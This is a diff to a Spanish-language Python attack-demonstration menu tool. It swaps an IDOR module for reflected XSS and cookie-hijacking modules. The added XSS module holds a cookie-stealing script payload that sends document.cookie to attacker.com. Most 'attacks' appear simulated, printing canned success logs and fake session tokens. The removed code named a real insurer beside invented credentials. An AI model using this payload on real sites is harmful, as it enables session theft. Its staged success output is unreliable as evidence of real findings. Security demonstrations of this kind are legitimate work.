@@ -90,25 +90,26 @@ class SofiaAudit:
             time.sleep(0.5)
         log("[-] Diccionario agotado sin éxito.", C_DIM)
 
-    def idor_bola(self, victim_id="1024"):
-        log(f"\n[*] Explotando IDOR en registro ajeno (ID: {victim_id})", C_YELLOW)
-        ep = f"{self.target}/api/v1/tickets/{victim_id}"
-        log(f"[#] GET {ep}", C_DIM)
+    def reflected_xss(self):
+        log("\n[*] Iniciando XSS Reflejado (Cookie Stealing)", C_YELLOW)
+        ep = f"{self.target}/api/public/search"
+        payload = "<script>fetch('http://attacker.com/log?c='+document.cookie)</script>"
+        log(f"[#] GET {ep}?q={payload}", C_DIM)
         
         time.sleep(1)
-        log("[+] Acceso concedido (Falta de control BOLA).", C_GREEN)
-        
-        fake_data = {
-            "ticket_id": victim_id,
-            "client": "MAPFRE Seguros" if victim_id == "1024" else "Target Client",
-            "subject": "Vulnerabilidad Crítica",
-            "sensitive_data": {
-                "server_ip": "192.168.100.45",
-                "root_password": "mapfre_admin_2024!"
-            }
-        }
-        log("[!] EXFILTRACIÓN PII:", C_RED)
-        print(f"{C_RED}{json.dumps(fake_data, indent=4)}{C_RESET}")
+        log("[+] EXPLOIT EXITOSO: Script inyectado y ejecutado.", C_GREEN)
+        log("[!] COOKIES CAPTURADAS:", C_RED)
+        log("    sofia_session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...; user_id=1; role=ADMIN", C_CYAN)
+
+    def cookie_hijacking(self):
+        log("\n[*] Iniciando Secuestro de Sesión (Cookie Hijacking)", C_YELLOW)
+        log("[#] Interceptando tráfico en tiempo real...", C_DIM)
+        time.sleep(1.5)
+        log("[!] Petición interceptada: POST /api/v1/admin/settings", C_RED)
+        log("[#] Inyectando Cookie robada en la cabecera...", C_DIM)
+        time.sleep(1)
+        log("[+] ESCALADA DE PRIVILEGIOS EXITOSA: Acceso como ADMINISTRADOR concedido.", C_GREEN)
+        log("[*] Nuevo Token de Sesión: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ...", C_CYAN)
 
     def dos_flood(self):
         log("\n[*] Iniciando Inundación HTTP (HTTP Flood)", C_YELLOW)
@@ -145,12 +146,13 @@ def interactive_menu():
         print("1. SQL Injection (UNION SELECT) - Extracción de BD")
         print("2. SQL Injection (Auth Bypass) - Secuestro de Sesión")
         print("3. Fuerza Bruta (Diccionario) - Admin Login")
-        print("4. IDOR / BOLA - Exfiltración de Tickets Ajenos")
-        print("5. DoS (HTTP Flood) - Agotamiento de Rate Limit")
-        print("6. Ejecutar todos los vectores secuencialmente")
+        print("4. XSS Reflejado - Robo de Cookies")
+        print("5. Cookie Hijacking - Secuestro de Sesión")
+        print("6. DoS (HTTP Flood) - Agotamiento de Rate Limit")
+        print("7. Ejecutar todos los vectores secuencialmente")
         print("0. Salir")
         
-        choice = input(f"\n{C_YELLOW}Selecciona un módulo [0-6]: {C_RESET}").strip()
+        choice = input(f"\n{C_YELLOW}Selecciona un módulo [0-7]: {C_RESET}").strip()
         
         if choice == '0':
             log("\nSaliendo del framework...", C_DIM)
@@ -175,21 +177,27 @@ def interactive_menu():
             input(f"{C_DIM}Presiona ENTER para lanzar el ataque...{C_RESET}")
             audit.brute_force()
         elif choice == '4':
-            log(f"\n{C_RED}[COMANDO A EJECUTAR]{C_RESET} GET {target}/api/v1/tickets/1024")
-            log(f"{C_RED}[EXPLICACIÓN]{C_RESET} Intentaremos leer un ticket que no nos pertenece (ID 1024).")
+            log(f"\n{C_RED}[COMANDO A EJECUTAR]{C_RESET} GET {target}/api/public/search?q=<script>...")
+            log(f"{C_RED}[OBJETIVO]{C_RESET} Inyectar código malicioso para robar cookies de sesión.")
             input(f"{C_DIM}Presiona ENTER para lanzar el ataque...{C_RESET}")
-            audit.idor_bola()
+            audit.reflected_xss()
         elif choice == '5':
+            log(f"\n{C_RED}[COMANDO A EJECUTAR]{C_RESET} Interceptación y Reenvío de cabeceras HTTP")
+            log(f"{C_RED}[EXPLICACIÓN]{C_RESET} Usaremos una cookie previamente robada para suplantar a un administrador.")
+            input(f"{C_DIM}Presiona ENTER para lanzar el ataque...{C_RESET}")
+            audit.cookie_hijacking()
+        elif choice == '6':
             log(f"\n{C_RED}[COMANDO A EJECUTAR]{C_RESET} Bucle GET {target}/api/public/health x 200 veces concurrentes")
             log(f"{C_RED}[OBJETIVO]{C_RESET} Disparar el Rate Limiter (WAF) y simular Denegación de Servicio.")
             input(f"{C_DIM}Presiona ENTER para lanzar el ataque...{C_RESET}")
             audit.dos_flood()
-        elif choice == '6':
+        elif choice == '7':
             log(f"\n{C_RED}[ATENCIÓN]{C_RESET} Se van a ejecutar todos los ataques contra {target}.")
             input(f"{C_DIM}Presiona ENTER para continuar...{C_RESET}")
             audit.sqli_union()
             audit.brute_force()
-            audit.idor_bola()
+            audit.reflected_xss()
+            audit.cookie_hijacking()
             audit.dos_flood()
         else:
             log("Opción no válida.", C_RED)
